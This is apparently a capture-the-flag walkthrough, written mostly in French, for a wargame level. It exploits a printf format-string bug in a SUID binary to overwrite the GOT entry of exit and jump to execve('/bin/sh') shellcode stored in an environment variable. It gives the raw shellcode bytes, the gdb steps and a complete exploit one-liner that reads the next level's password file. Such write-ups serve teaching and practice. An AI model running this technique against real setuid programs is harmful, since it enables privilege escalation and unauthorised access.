# Walkthrough - level05

The program has SUID permissions from the user `level06`, which will allow us to obtain their flag.

# Dissassembly

- Une fonction `fgets` qui lit 100 bytes sur la stdin
- Une boucle `for` qui converti les majuscules en minuscles
- Un `printf` qui affiche la chaine de caractères converti
- Un appel a la fonction `exit`

# Exploit

L'objectif est d'aller réecrite la GOT (Global offset table) de la fonction `exit` pour faire jump la fonction sur un shellcode qui se trouve dans les variables d'env.

Dans ce cas, nous ne pouvons pas utiliser un débordement avec la fonction `fgets`, car elle lit dans un buffer plus grand.

Cependant, `printf` n'a pas de format spécifique, le format utilisé est celui lu à partir de l'entrée standard.

Il existe un formatage spécial avec printf `%n` qui permet de stocker le nombre de caractères imprimés directement dans une adresse.

```c
#include <stdio.h>

int main(void) {
    int a = 0 ;
    printf("Hello world\n%n", &a) ;
    printf("a : %d\n", a) ;
    return 0 ;
}
``` 

```
Hello World
a : 12
```

Nous pouvons alors utiliser le formatage `%n` en passant l'adresse de `m` comme argument pour modifier sa valeur.

Les arguments des fonctions variadiques (comme `printf`) sont passés par la pile et non par les registres. Cela nous permet de vider notre pile en utilisant le format suivant :

``bash
./level05
%08x %08x %08x %08x %08x %08x %08x
```

Maintenant, nous voulons trouver le nombre d'arguments à retirer de la pile avant d'accéder au buffer (`s`).

``bash
./level05
aaaa %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x
```

```
aaaa 00000064 f7fcfac0 f7ec3af9 ffffd6ef ffffd6ee 00000000 ffffffff ffffd774 f7fdb000 61616161 38302520 30252078 25207838
```

Comme indiqué ci-dessus, nous accédons au tampon (`s`) après avoir pop la pile 9 fois (`0x61` correspond à `a` en ASCII).

Ensuite, il nous faut l'addresse qui est déreférencer par la GOT (`exit`), pour cela, on peut utiliser GDB.

```bash
gdb ./level05
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330
End of assembler dump.
```

L'adresse à ré écrire est donc `0x80497e0`.

Maintenant, il nous faut l'adresse d'un shellcode, pour cela nous allons l'injecter dans les variables d'environement et obtenir son adresse avec le script suivant:


```bash
export SHELLCODE=$(python -c 'print("\x90" * 20 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")')
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char *ptr;

    if(argc < 3) {
        printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
        exit(0);
    }
    ptr = getenv(argv[1]); /* get env var location */
    ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
    printf("%s will be at %p\n", argv[1], ptr);
}
```
 
Il faut bien penser à compiler le programme avec le flag -m32 pour forcer une compilation 32bits.

```bash
gcc /tmp/env_variable.c -m32 -o /tmp/env_variable
/tmp/env_variable SHELLCODE ./level05

```

```bash
SHELLCODE will be at 0xffffd8d5
```

`0xffffd8d5 => 4294957269`

Comme l'adresse est tres très grande, nous allons l'écrire en utilisant deux `%n` en écrivant 4 bytes puis 4 autre bytes.


La premier valeur à stocker est `0xd8d5 = 55509` (comme nous sommes en little endian)

`55509 - 4 - 4 - 4 - 8 * 8 = 55433`

La deuxieme valeur à stocker est `0xffff = 65535`

`65535 - 55509 -  = 10026`


Avec le padding de printf, la commande entière est donc la suivante:

```bash
(python -c 'print("\xe0\x97\x04\x08" + "A" * 4 + "\xe2\x97\x04\x08" + "%08x" * 8 + "%055433x" + "%n" + "%010026x" + "%n")'; echo "cat /home/users/level06/.pass") | ./level05
```